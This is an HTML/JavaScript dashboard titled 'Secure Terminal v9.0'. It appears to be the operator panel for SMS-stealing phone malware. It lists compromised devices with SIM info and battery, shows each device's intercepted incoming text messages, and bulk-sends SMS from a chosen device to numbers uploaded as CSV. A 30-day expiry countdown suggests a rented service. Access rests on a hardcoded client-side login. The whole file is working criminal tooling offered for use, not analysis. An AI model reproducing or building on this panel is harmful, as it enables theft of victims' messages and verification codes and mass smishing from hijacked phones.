<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Terminal v9.0</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --bg: #000; --card: #111; --blue: #00d4ff; --green: #00ff88;
            --pink: #ff00ff; --red: #ff3131; --yellow: #fefe33;
        }
        * { box-sizing: border-box; font-family: 'Consolas', monospace; }
        body { background: var(--bg); color: #fff; margin: 0; padding: 10px; overflow-x: hidden; }

        /* 🔐 Login Screen */
        #loginScreen {
            position: fixed; top:0; left:0; width:100%; height:100%; background:var(--bg);
            z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .login-box { background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid var(--blue); text-align: center; width: 90%; max-width: 350px; }
        .logo-gear { font-size: 3rem; color: var(--blue); margin-bottom: 15px; animation: spin 4s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #000; color: #fff; text-align: center; outline: none; }
        input:focus { border-color: var(--blue); }
        .btn-login { width: 100%; padding: 12px; background: var(--blue); color: #000; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; }

        /* 📊 Dashboard Layout */
        #dashboard { display: none; }
        .top-stats { display: flex; justify-content: space-around; background: var(--card); padding: 10px; border-radius: 12px; margin-bottom: 15px; border-bottom: 2px solid var(--pink); font-size: 0.75rem; }
        .stat-item { text-align: center; }
        .stat-val { display: block; font-size: 1.1rem; font-weight: bold; }

        #countdown { position: absolute; top: 10px; right: 10px; font-size: 0.7rem; color: var(--red); }

        #deviceContainer { display: flex; flex-direction: column; gap: 8px; }
        .device-card {
            background: var(--card); border: 1px solid #222; border-radius: 12px;
            padding: 12px; display: flex; align-items: center; justify-content: space-between; cursor: pointer;
        }
        .serial { color: var(--yellow); font-weight: bold; width: 25px; }
        .brand { font-size: 0.9rem; color: var(--blue); font-weight: bold; }
        
        /* 📱 Modals */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; backdrop-filter: blur(10px); }
        .modal-content { background: #0c0c0c; width: 90%; max-width: 380px; margin: 15% auto; border-radius: 20px; padding: 20px; border: 1px solid var(--blue); position: relative; text-align: center; }
        .btn-action { background:#151515; padding:15px; border-radius:10px; cursor:pointer; transition: 0.3s; border: 1px solid #333; }
        .btn-action:hover { border-color: var(--blue); color: var(--blue); background: #222; }
        .btn-send { background: var(--blue); color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: bold; margin-top: 10px; width: 100%; cursor: pointer; }
        
        .sms-item { background:#151515; padding:10px; border-radius:8px; margin-bottom:10px; border-left:3px solid var(--blue); text-align: left; }
    </style>
</head>
<body>

    <div id="loginScreen">
        <div class="login-box">
            <div class="logo-gear">⚙️</div>
            <h2 style="color:var(--blue)">ADMIN LOGIN</h2>
            <input type="text" id="user" placeholder="Username">
            <input type="password" id="pass" placeholder="Password">
            <button class="btn-login" onclick="checkLogin()">UNLOCK SYSTEM</button>
            <p id="err" style="color:var(--red); font-size: 0.8rem; margin-top: 10px;"></p>
        </div>
    </div>

    <div id="dashboard">
        <div id="countdown">30d 00h 00m 00s</div>
        <div class="top-stats">
            <div class="stat-item">Total<span class="stat-val" id="totalCnt">0</span></div>
            <div class="stat-item" style="color:var(--green)">Online<span class="stat-val" id="onlineCnt">0</span></div>
            <div class="stat-item" style="color:var(--red)">Offline<span class="stat-val" id="offlineCnt">0</span></div>
        </div>
        <div id="deviceContainer"></div>
    </div>

    <div id="menuModal" class="modal">
        <div class="modal-content">
            <span style="position:absolute; top:10px; right:20px; cursor:pointer; color:var(--red); font-size:1.5rem" onclick="closeModal('menuModal')">×</span>
            <h3 id="popBrand" style="color:var(--blue); margin-bottom:20px;">DEVICE</h3>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                <div class="btn-action" onclick="openSmsModal()"><i class="fa-solid fa-paper-plane"></i><br>SEND SMS</div>
                <div class="btn-action" onclick="openViewSms()"><i class="fa-solid fa-message"></i><br>VIEW SMS</div>
            </div>
        </div>
    </div>

    <div id="smsInputModal" class="modal">
        <div class="modal-content">
            <span style="position:absolute; top:10px; right:20px; cursor:pointer; color:var(--red); font-size:1.5rem" onclick="closeModal('smsInputModal')">×</span>
            <h3 style="color:var(--blue)">CONSTRUCT BROADCAST</h3>
            <input type="text" id="targetNum" placeholder="10 Digit Number" maxlength="10">
            <p style="font-size: 0.6rem; color: #666; margin: 5px 0;">-- OR UPLOAD CSV (NUMBERS ONLY) --</p>
            <input type="file" id="csvFile" accept=".csv" style="font-size: 0.7rem; border: none; background:transparent;">
            <textarea id="smsMsg" placeholder="Enter message text..." rows="4"></textarea>
            <button class="btn-send" onclick="handleSend()">EXECUTE BROADCAST</button>
        </div>
    </div>

    <div id="viewSmsModal" class="modal">
        <div class="modal-content" style="max-width: 500px; max-height: 80vh; overflow-y: auto;">
            <span style="position:absolute; top:10px; right:20px; cursor:pointer; color:var(--red); font-size:1.5rem" onclick="closeModal('viewSmsModal')">×</span>
            <h3 id="viewBrand" style="color:var(--blue)">INCOMING MESSAGES</h3>
            <div id="smsList" style="margin-top: 20px;">
                <p style="color:gray;">Loading messages...</p>
            </div>
        </div>
    </div>

    <script>
        let currentDeviceId = '';
        let currentDeviceBrand = '';

        function checkLogin() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(u === "ADMIN" && p === "2580") {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                fetchData();
                setInterval(fetchData, 5000);
                startTimer();
            } else {
                document.getElementById('err').innerText = "Access Denied: Invalid Credentials";
            }
        }

        async function fetchData() {
            try {
                const res = await fetch('/api/get-data');
                const data = await res.json();
                const container = document.getElementById('deviceContainer');
                container.innerHTML = data.map((d, i) => `
                    <div class="device-card" onclick="openMenu('${d.id}', '${d.brand}')">
                        <div class="serial">#${i + 1}</div>
                        <div style="flex:1; margin-left:10px;">
                            <div class="brand">${d.brand}</div>
                            <div style="font-size:0.7rem; color:#666">${d.sim_info}</div>
                        </div>
                        <div style="text-align:right">
                            <div style="color:var(--green); font-size:0.8rem">${d.battery}%</div>
                            <div style="font-size:0.5rem; color:var(--green)">ONLINE</div>
                        </div>
                    </div>
                `).join('');
                document.getElementById('totalCnt').innerText = data.length;
                document.getElementById('onlineCnt').innerText = data.length;
            } catch (e) { }
        }

        function openMenu(id, brand) {
            currentDeviceId = id;
            currentDeviceBrand = brand;
            document.getElementById('popBrand').innerText = brand;
            document.getElementById('menuModal').style.display = 'block';
        }

        function openSmsModal() {
            closeModal('menuModal');
            document.getElementById('smsInputModal').style.display = 'block';
        }

        async function openViewSms() {
            closeModal('menuModal');
            document.getElementById('viewBrand').innerText = currentDeviceBrand + " - LOGS";
            document.getElementById('viewSmsModal').style.display = 'block';
            document.getElementById('smsList').innerHTML = '<p style="color:gray;">Syncing logs...</p>';

            try {
                const res = await fetch(`/api/get-messages?id=${currentDeviceId}`);
                const msgs = await res.json();
                if (msgs.length === 0) {
                    document.getElementById('smsList').innerHTML = '<p style="color:var(--red);">No logs found yet.</p>';
                    return;
                }
                document.getElementById('smsList').innerHTML = msgs.map(m => `
                    <div class="sms-item">
                        <div style="color:var(--yellow); font-size:0.8rem; font-weight:bold;">From: ${m.sender}</div>
                        <div style="color:#fff; font-size:0.9rem; margin:5px 0;">${m.message}</div>
                        <div style="color:#555; font-size:0.6rem; text-align:right;">${m.created_at}</div>
                    </div>
                `).join('');
            } catch (e) {
                document.getElementById('smsList').innerHTML = '<p style="color:var(--red);">Failed to fetch logs.</p>';
            }
        }

        function closeModal(m) { document.getElementById(m).style.display = 'none'; }

        async function handleSend() {
            const num = document.getElementById('targetNum').value;
            const msg = document.getElementById('smsMsg').value;
            const file = document.getElementById('csvFile').files[0];

            if(!msg) { alert("Error: Message body required"); return; }

            if(file) {
                const reader = new FileReader();
                reader.onload = async function(e) {
                    const numbers = e.target.result.split(/\r?\n/).map(x => x.trim()).filter(x => x.length >= 10);
                    if(numbers.length === 0) { alert("CSV is empty or invalid!"); return; }
                    await submitSms(numbers, msg);
                };
                reader.readAsText(file);
            } else if(num.length === 10) {
                await submitSms([num], msg);
            } else {
                alert("Enter 10-digit number or upload valid CSV");
            }
        }

        async function submitSms(numbers, message) {
            try {
                const res = await fetch('/api/send-sms', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: currentDeviceId, numbers, message })
                });
                if(res.ok) {
                    alert("System: " + numbers.length + " Messages Queued Successfully");
                    closeModal('smsInputModal');
                }
            } catch(e) { alert("Error connecting to server"); }
        }

        function startTimer() {
            let exp = localStorage.getItem('v9_exp') || new Date().getTime() + (30*24*60*60*1000);
            localStorage.setItem('v9_exp', exp);
            setInterval(() => {
                let diff = exp - new Date().getTime();
                if(diff <= 0) { document.getElementById('countdown').innerText = "EXPIRED"; return; }
                let d = Math.floor(diff/86400000), h = Math.floor((diff%86400000)/3600000);
                let m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('countdown').innerText = `${d}d ${h}h ${m}m ${s}s`;
            }, 1000);
        }
    </script>
</body>
</html>
